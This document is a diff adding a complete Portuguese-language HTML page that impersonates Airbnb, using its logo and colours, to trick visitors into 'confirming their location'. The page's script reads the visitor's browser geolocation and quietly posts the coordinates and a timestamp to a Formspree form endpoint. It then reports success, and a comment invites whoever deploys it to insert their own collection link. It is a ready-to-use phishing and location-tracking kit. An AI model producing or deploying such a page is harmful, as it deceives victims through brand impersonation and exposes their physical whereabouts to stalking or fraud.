@@ -1,0 +1,78 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Confirmação de Localização | Airbnb</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+      background-color: #f7f7f7;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+      display: inline-block;
+    }
+    button {
+      background-color: #FF5A5F;
+      color: white;
+      padding: 15px 25px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #e04e53;
+    }
+    img {
+      width: 150px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <img src="https://logodownload.org/wp-content/uploads/2017/08/airbnb-logo-1-1.png" alt="Airbnb">
+  <h2>Confirme sua Localização</h2>
+  <p>Para garantir a segurança e autenticidade do anúncio, precisamos confirmar sua localização atual.</p>
+  <button onclick="pegarLocalizacao()">Confirmar Localização</button>
+</div>
+
+<script>
+  function pegarLocalizacao() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        fetch('https://formspree.io/f/xjkwkerd', {  // <-- Seu link aqui!
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            latitude: latitude,
+            longitude: longitude,
+            timestamp: new Date().toISOString()
+          })
+        });
+
+        alert('Localização confirmada com sucesso!');
+      }, function(error) {
+        alert('Erro ao confirmar localização: ' + error.message);
+      });
+    } else {
+      alert('Seu navegador não suporta localização.');
+    }
+  }
+</script>
+
+</body>
+</html>
